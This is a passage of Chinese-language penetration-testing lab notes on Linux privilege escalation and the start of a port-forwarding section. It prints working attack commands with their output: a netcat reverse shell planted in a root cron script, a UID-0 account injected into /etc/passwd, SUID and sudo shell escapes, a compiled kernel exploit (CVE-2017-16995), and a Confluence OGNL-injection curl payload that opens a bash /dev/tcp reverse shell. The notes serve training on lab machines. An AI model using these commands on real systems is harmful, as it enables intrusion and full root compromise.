[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1] (0/0)
[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 0] (0/0)
...
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
1 of 1 target successfully completed, 1 valid password found
```
> eve/Lab123

#### 4. SSH 登入 user，檢查權限
```
┌──(chw㉿CHW)-[~]
└─$  ssh eve@192.168.50.214
eve@192.168.50.214's password:
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
eve@debian-privesc:~$
```
使用 `sudo -l` 列出 sudo 功能來驗證是否能以特權使用者身分執行
```
eve@debian-privesc:~$ sudo -l
[sudo] password for eve:
Matching Defaults entries for eve on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```
> eve 是管理帳戶，可以以 elevated user 執行

```
eve@debian-privesc:~$ sudo -i
[sudo] password for eve:

root@debian-privesc:/home/eve# whoami
root
```
### Inspecting Service Footprints
#### watch: ps -aux
daemons 是在啟動時產生的 Linux 服務，System administrators 依賴 custom daemons 來執行 ad-hoc tasks\
與 Windows 不同之處，在 Linux 上我們可以列出有關高權限 process 的訊息，可以使用 ps 命令來列舉所有正在運行的 prcess，搭配 watch 命令來更新。
```
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...

joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
...
```
> `watch -n 1`：每 1 秒執行一次後面的指令\
`ps -aux`：列出所有運行中的 process\
`grep pass`：過濾出有包含 "pass" 的進程 (與密碼有關)
>> 可以看到 administrator 設置了一個 system daemon，有一個以 root 權限運行的系統 process，使用 sshpass -p 'Lab123' 來執行 SSH 登入 eve@127.0.0.1

#### tcpdump
利用 tcpdump 進行封包截取，作為提升權限 (Privilege Escalation)
tcpdump 需要管理員 (root) 權限，因為它使用 raw sockets 來捕獲流量，企業中有些 IT 人員會被授予特定 sudo 權限來執行 tcpdump。
```
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```
## Insecure File Permissions
Abuse 不安全的 cron job 與 file permissions\
### Abusing Cron Jobs
假設已經取得一個低權限使用者
```
┌──(chw㉿CHW)-[~]
└─$ ssh joe@192.168.235.214
joe@192.168.235.214's password: 
joe@debian-privesc:~$
```
在 linux 系統上， the cron time-based job scheduler is a prime target。如果管理員設定的 cron jobs 權限過於寬鬆 (可被低權限使用者修改)，攻擊者可以修改這個腳本並植入惡意指令，等到 cron 自動執行時，就能以 root 權限執行該指令。

#### 1. 查看有關 CRON 的 syslog
```
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
> `user_backups.sh` 是使用 root 權限

檢查 user_backups.sh 權限
```
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```
> script 將使用者的主目錄複製到 backups 子目錄\
> permission: 每個 local user 都可寫入

#### 2. 塞入 Reverse shell
```
joe@debian-privesc:~$ cd .scripts

joe@debian-privesc:~/.scripts$ echo >> user_backups.sh

joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 5678 >/tmp/f" >> user_backups.sh

joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 5678 >/tmp/f
```
>`echo >> user_backups.sh`: 只是單純塞入換行符號\
>`rm /tmp/f;mkfifo /tmp/f;`: 刪除 /tmp/f，然後建立一個 FIFO\
>`cat /tmp/f | /bin/sh -i 2>&1 `: 讀取 FIFO 並傳給 /bin/sh -i，這樣 sh 會執行從 netcat 傳來的指令\
>`nc 192.168.45.210 5678 >/tmp/f`: >/tmp/f 讓 Netcat 透過 FIFO 接收命令的輸入

等待 cron 自動執行後，就能收到 reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 5678
listening on [any] 5678 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.235.214] 37594
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
### Abusing Password Authentication
除非使用 Active Directory 或 LDAP 等的 centralized credential system，否則 Linux 密碼通常儲存在 `/etc/shadow`，且 normal users 無法讀取。

>[!Important]
> 如果 `/etc/passwd` 第二欄仍含有密碼雜湊值，它將**優先**於 `/etc/shadow` 被系統用來驗證登入。

代表: 若我們可以寫入 /etc/passwd，就可以有效地為任何帳戶設定任意密碼。

#### OpenSSL 生成 Hash password，注入 /etc/passwd

>[!Note]
> OpenSSL passwd指令的輸出可能會因執行該指令的系統而異。在較舊的系統上，可能預設為 DES 演算法，而在某些較新的系統上，它可以以 MD5 格式輸出密碼。

```
joe@debian-privesc:~$ ls -lah /etc/passwd
-rw-r--rw- 1 root root 2.3K Aug 29  2022 /etc/passwd
joe@debian-privesc:~$ openssl passwd chw
nWfVpeIzUj9g6
joe@debian-privesc:~$ echo "root2:nWfVpeIzUj9g6:0:0:root:/root:/bin/bash" >> /etc/passwd
joe@debian-privesc:~$ su root2
Password: 
root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
root@debian-privesc:/home/joe#
```
> 1. 發現 `/etc/passwd` 可寫
> 2. `openssl passwd chw`: 生成密碼為 'chw' 的 hash。 \
> 若使用參數 `-1`表示使用 MD5 Hashing。
> 3. `echo "root2:nWfVpeIzUj9g6:0:0:root:/root:/bin/bash" >> /etc/passwd`: 塞入新使用者(root2)，設定對應 hash password 與權限 (user id (UID): `zero` & group id (GID): `zero`)

## Insecure System Components
包含錯誤配置的系統應用程式和權限如何導致提權
### Abusing Setuid Binaries and Capabilities
setuid binary 的目的: 當使用者或系統自動化腳本啟動一個程式時，這個程式會繼承啟動它的 UID/GID，稱為 "real UID/GID"。\
前面提到 /etc/shadow 只能由 root 權限讀寫，🥚 非特權使用者如何更改自己的密碼

#### - SUID
分析 passwd program:
##### 1. 變更密碼
```
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password: 
```
##### 2. 觀察 process ID
```
joe@debian-privesc:~$ ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      2438  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
```
> `ps`: 顯示正在運行的 process。\
`u`: 以使用者格式顯示資訊，包括用戶、CPU 和記憶體的使用狀況。\
`-C passwd`: 篩選出正在運行的 passwd 指令。passwd 通常用來改變用戶的密碼。
>> 發現**passwd 以 root 使用者身分執行**

##### 3. 透過 proc 查看 kernel information
real UID 與 effective UID 會 assigned 給 proc pseudo-filesystem
```
joe@debian-privesc:~$ grep Uid /proc/2438/status
Uid:	1000	0	0	0
```
> `passwd` process 的 Real UID 是 1000（代表 joe），但其餘三個值（effective UID 、 saved UID 、 filesystem UID）都被設置為 0，代表 root 用戶的 UID。這說明 passwd 以 root 權限運行。

正常狀況應該四個值都會是: 1000
```
joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
Uid:	1000	1000	1000	1000
```

##### 4. SUID
>[!Important]
>passwd 程式之所以不同，是因為它設置了 `Set-User-ID (SUID)` special flag。\
>這是 UNIX 系統中一個特殊的文件屬性，當程式設置了 SUID 標誌時，該程式運行時會使用該程式所有者的有效 UID（而不是運行該程式的用戶的 UID）。\
>>對於 passwd 來說，它會使用 root 用戶的 UID（0），即使該程式是由普通用戶 joe 啟動的。

```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```
> -rw`s`r-xr-x: SUID 以 s flag 表示


可以透過 `chmod u+s <filename>` 設定檔案的 SUID

##### 5. 利用 SUID 錯誤配置
在範例中，find 工具有一個錯誤配置，設定了 SUID 標誌。可以利用這個工具來運行一個 Shell，並獲得 root 權限。
```
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0#
```
> find 本身設有 SUID
> `-exec "/usr/bin/bash" -p \;`:\
`-exec` 參數允許 find 在找到的每個文件上執行指定的指令。\
`"/usr/bin/bash"` 系統內的 bash。\
`-p`: bash 內建選項，允許 bash 保持其有效 UID（EUID）不變，這意味著如果 bash 是以 root 權限執行的，它會保持 root 權限，而不會降級到普通用戶權限。
`\;` 是 find 的結束標誌，表示 -exec 命令的結束。
>> 雖然 UID 仍然屬於joe，但有效使用者 ID 來自root。

#### - Linux Capabilities
[Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) 是一種細化的權限管理機制，允許特定的程式、二進制文件或服務獲得某些通常只有 root 才能執行的權限。例如：\
`cap_net_raw`：允許程式發送原始網路封包（用於流量監控）。\
`cap_setuid`：允許程式修改使用者 ID（UID）。\
`cap_net_admin`：允許程式執行網路管理相關操作。

##### 1. 尋找特殊 Capabilities
尋找可執行檔案擁有特殊 Capabilities
```
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
> `-r /`：從根目錄開始遞迴搜尋所有檔案
>> `/usr/bin/perl = cap_setuid+ep` 與 `/usr/bin/perl5.28.1 = cap_setuid+ep` 兩個 perl binaries啟用了 setuid，`+ep` flag，可以更改自身的 UID

##### 2. 利用 Perl 提升權限
到 [GTFOBins](https://gtfobins.github.io/) 查詢 ，找到對應的 Exploit 方法
```
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

### Abusing Sudo
`sudo`（Superuser-Do）是一個 UNIX/Linux 工具，允許一般使用者以 root 或其他特定使用者的身份執行指令。\
要使用 sudo，該使用者必須在 sudo 群組 內（適用於 Debian-based Linux），或者 `/etc/sudoers` 文件必須明確允許該使用者執行特定指令。\
使用 `sudo -l` 或 `sudo --list` 來查看當前使用者被允許執行的 sudo 命令
```
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
> crontab 作業、tcpdump 和 apt-get 允許 sudo

#### 1. 查詢 [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/) 以取得如何利用 tcpdump
```
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
```
> 卡關，Permission denied

#### 2. 檢查原因：`/var/log/syslog`
```
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```
>  AppArmor（一種強制存取控制（MAC）機制）阻止了 tcpdump 執行 /tmp/tmp.c5hrJ5UrsF

#### 3. 檢查 AppArmor 狀態: `aa-status`
```
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
...
2 profiles are in complain mode.
   libreoffice-oopslash
   libreoffice-soffice
3 processes have profiles defined.
3 processes are in enforce mode.
   /usr/sbin/cups-browsed (502)
   /usr/sbin/cupsd (654)
   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```
> `aa-status`: 顯示 AppArmor（應用程式安全機制）的當前狀態\
> `enforce mode`:  主動阻擋 違規行為\
> 3 個正在運行的程序 受 AppArmor 強制模式 保護:
> - /usr/sbin/cups-browsed (502)
> - /usr/sbin/cupsd (654)
> - /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
>> 透過 AppArmor 提權，不可行

#### 4. 改用 apt-get 進行特權提升
根據 [GTFObins](https://gtfobins.github.io/gtfobins/apt-get/) 建議：
```
joe@debian-privesc:~$ sudo apt-get changelog apt
...
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```
### Exploiting Kernel Vulnerabilities
如何利用 Linux Kernel 漏洞來提升權限\
#### 1. 收集系統資訊
檢查 `/etc/issue` 取得目標資訊
```
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```
檢查核心版本和系統架構
```
joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic

joe@ubuntu-privesc:~$ arch 
x86_64
```
Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic)， x86 架構

#### 2. 尋找可用的 Kernel 漏洞
使用 searchsploit 來尋找與目標版本相符的核心漏洞，以 "linux kernel Ubuntu 16 Local Privilege Escalation" 當作 key word，且過濾掉不符的版本
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fed | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/ | linux_x86/local/42276.c
Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overlayfs' Local Privilege | linux/local/40688.rb
Linux Kernel (Ubuntu 17.04) - 'XFRM' Local Privilege Escalation       | linux/local/44049.md
Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local P | linux/local/15704.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overla | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overla | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32= | linux_x86-64/local/31347.c
Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free | linux/local/41999.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege | linux/local/39166.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (M | linux/local/40759.rb
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset'  | linux_x86-64/local/40049.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOA | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Pri | linux/local/40489.txt
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Priv | linux_x86/local/15916.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local P | linux/local/14814.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privi | linux/local/17787.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Es | linux/local/45010.c
```
> 嘗試最後一個漏洞（linux/local/45010.c），版本較新並且與我們的核心版本匹配，因為它針對的是 4.13.9 以下的任何版本。

#### 3. 編譯 Exploit
使用 gcc 來編譯 exploit\
編譯的環境架構需要與目標機器相同
```
┌──(chw㉿CHW)-[~]
└─$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .

┌──(chw㉿CHW)-[~]
└─$ head 45010.c -n 20
/*
  Credit @bleidl, this is a slight modification to his original POC
  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html

  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic
  4.4.0-81-generic
  4.4.0-116-generic
  4.8.0-58-generic
  4.10.0.42-generic
  4.13.0-21-generic

  Tested on Fedora 27
  4.13.9-300
  gcc cve-2017-16995.c -o cve-2017-16995
  internet@client:~/cve-2017-16995$ ./cve-2017-16995
```
```
┌──(chw㉿CHW)-[~]
└─$ mv 45010.c cve-2017-16995.c
                                                                                                        
┌──(chw㉿CHW)-[~]
└─$ scp cve-2017-16995.c joe@192.168.235.216:
joe@192.168.235.216's password: 
cve-2017-16995.c
```

要將 source code 編譯成可執行檔，我們只需要呼叫 gcc 並指定 C source code 和輸出檔名
```
joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
joe@ubuntu-privesc:~$ ls
cve-2017-16995  cve-2017-16995.c
```

#### 4. 執行 Exploit
編譯後檢查 Linux ELF file architecture
```
joe@ubuntu-privesc:~$ file cve-2017-16995
cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=588d687459a0e60bc6cb984b5180ec8c3558dc33, not stripped
```
> x86-64

```
joe@ubuntu-privesc:~$ ./cve-2017-16995
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88007bd1f100
[*] Leaking sock struct from ffff880079bd9c00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880075c11e40
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880075c11e40
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
#
```
> 成功執行

# Port Redirection and SSH Tunneling
## Why Port Redirection and Tunneling?
了解常見網頁佈局之間的區別、考慮常見網路安全設備的影響、了解何時使用連接埠重新導向和 Tunnel 技術
>[!Note]
>**[Flat Network](https://en.wikipedia.org/wiki/Flat_network)**: 所有設備之間可以自由溝通，沒有存取限制，這種架構很容易讓攻擊者入侵一台設備後橫向擴散到整個網路，因此安全性很低。\
**[Segmented Network](https://en.wikipedia.org/wiki/Network_segmentation)**: 將網路切分成多個子網（Subnet），每個子網內的設備有特定用途，只有必要時才允許跨子網存取，這樣能有效阻止攻擊者輕易擴散。

在 segmentation process，大多數 network administrators 會控制 traffic into, out from, and across their networks.

>[!Note]
>[防火牆（Firewall）](https://en.wikipedia.org/wiki/Firewall_(computing)):\
軟體層面：Linux 的 iptables、Windows 的 Defender Firewall。
硬體層面：獨立的防火牆設備或內建防火牆功能的網路裝置。
作用：依照 IP 和端口規則過濾流量，限制內外網的資料流通。進階還有 深度封包檢測（[Deep Packet Inspection](https://en.wikipedia.org/wiki/Deep_packet_inspection), DPI），能根據封包內容過濾流量。


[Port redirection](https://en.wikipedia.org/wiki/Port_forwarding) 與 [tunneling](https://en.wikipedia.org/wiki/Tunneling_protocol) 都是可以用來穿越這些 boundaries 的策略
>[!Note]
>**Port Redirection**： 透過將資料從一個端口轉發到另一個端口，來改變流量的傳輸方式，使其能夠穿透防火牆或其他網路限制。\
**Tunneling**: 將一種協議的流量封裝在另一種協議內，例如 SSH Tunneling，可以把 HTTP 流量包裹在 SSH 連線內，使防火牆只看到 SSH 流量，而無法攔截 HTTP。\
Add'l info: [Network topology](https://en.wikipedia.org/wiki/Network_topology)

## Port Forwarding with Linux Tools
Port Forwarding:\
Port Forwarding 是將一個主機上的某個 Port 設定為監聽流量，並將接收到的數據包轉發到另一個目標地址或端口的技術。在正常的網路環境下，網管可能會設定 Port Forwarding 來讓外部設備能夠存取內部伺服器，例如：\
- 防火牆可以監聽某個 外部介面的端口，然後將流量轉送到內部伺服器。
- 家用路由器也常提供 Port Forwarding 功能，允許從外部網路存取內部網路設備。

### A Simple Port Forwarding Scenario
一台 [Confluence](https://www.atlassian.com/software/confluence) 版本的 Linux Web 伺服器，存在 [CVE-2022-26134](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html) 漏洞: 可以透過身份驗證，取得 RCE\
Enumeration: 兩個 network interfaces
- 一張連接到 [WAN](https://en.wikipedia.org/wiki/Wide_area_network)（廣域網路，模擬企業內部網路或互聯網），我們的 Kali 機器與它在同一個網段內，能夠直接連線
- 另一張連接到內部的 [DMZ](https://en.wikipedia.org/wiki/DMZ_(computing))（非軍事區，Demilitarized Zone），這是一個受限制的內部網段

在 Confluence 設定檔中，發現了一組 PostgreSQL 資料庫（PGDATABASE01） 的 IP 位址和登入憑證，該資料庫位於 DMZ 內。\
網路架構如下圖：\
![image](https://hackmd.io/_uploads/SkTnKHxs1l.png)

CONFLUENCE01 跨越 WAN 和 DMZ，可在兩個 networks 上進行通訊。 CONFLUENCE01 也在監聽 TCP port 8090 ; PGDATABASE01 也附加了 open socket，說明有東西正在監聽 TCP port 5432（**可能是 PostgreSQL 伺服器，因為預設連接埠是 5432**）。

目標： 利用我們在 CONFLUENCE01 上找到的憑證，嘗試從 Kali 機器連接到 PGDATABASE01 上的這個 PostgreSQL 連接埠。

### Setting Up the Lab Environment
為了存取 CONFLUENCE01，我們需要利用 Confluence Web 應用程式中的命令執行漏洞來取得 Reverse shell。
在 [Rapid7](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) 的 blog ，其中包含 [cURL](https://curl.se/) cmd 和 [proof-of-concept](https://en.wikipedia.org/wiki/Proof_of_concept) payload，該有效 payload 聲稱利用該漏洞來取得 reverse shell

- example payload from the Rapid7 blog post
```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```
> curl-v `http://10.0.0.28:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}`/

在不了解其功能的情況下，先弄清楚這個 proof-of-concept 中發生了什麼
> OGNL injection

>[!Note]
> OGNL: [Object-Graph Notation Language](https://en.wikipedia.org/wiki/OGNL)
> 一種 Java 應用程式中常用的表達語言。當應用程式以將使用者輸入傳遞給 OGNL 表達式解析器的方式處理使用者輸入時，就會發生 OOGNL injection。由於可以在 OGNL 表達式內執行 Java 程式碼，因此可以使用 OGNL injection 來執行任意程式碼。\
OGNL 注入負載本身使用 Java 的 ProcessBuilder 類別來產生Bash互動式反向 shell（bash -i）。

```java
new javax.script.ScriptEngineManager()
  .getEngineByName("nashorn")
  .eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()");
```
> 透過 ProcessBuilder 執行 bash -i，建立 Reverse Shell 連線到攻擊者的機器（10.0.0.28:1270）

#### 1. 將 payload 改成符合我們的環境
(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ ip a                        
...
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.45.182/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::98aa:d7b6:2ab1:44a3/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
                      
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 5678
listening on [any] 5678 ...
```
> 目標機器： `192.168.228.63:8090`
> 自己的 kali ip: `192.168.45.182`

```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.228.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/5678%200%3E%261%27%29.start%28%29%22%29%7D/
```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 5678
listening on [any] 5678 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.228.63] 33550
bash: cannot set terminal process group (2566): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```
> 成功執行 Reverse shell

#### 2. enumeration 機器設定
成功執行 Reverse shell 後，首先 enumeration CONFLUENCE01
##### 2.1 確認 network interface
```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:b0:50 brd ff:ff:ff:ff:ff:ff
    inet 192.168.228.63/24 brd 192.168.228.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:59:55 brd ff:ff:ff:ff:ff:ff
    inet 10.4.228.63/24 brd 10.4.228.255 scope global ens224
       valid_lft forever preferred_lft forever
```
> `ens192`（連到 WAN）：192.168.228.63\
`ens224`（連到內部 DMZ）：10.4.228.63

##### 2.2 ip route 確認連線狀況
```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.228.254 dev ens192 proto static 
10.4.228.0/24 dev ens224 proto kernel scope link src 10.4.228.63 
192.168.228.0/24 dev ens192 proto kernel scope link src 192.168.228.63
```
> 確認 10.4.228.0/24 內部網段可透過 `ens192 interface` 存取

##### 2.3 尋找 Confluence configuration

在 `/var/atlassian/application-data/confluence/confluence.cfg.xml` 中找到 Confluence 設定檔
```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

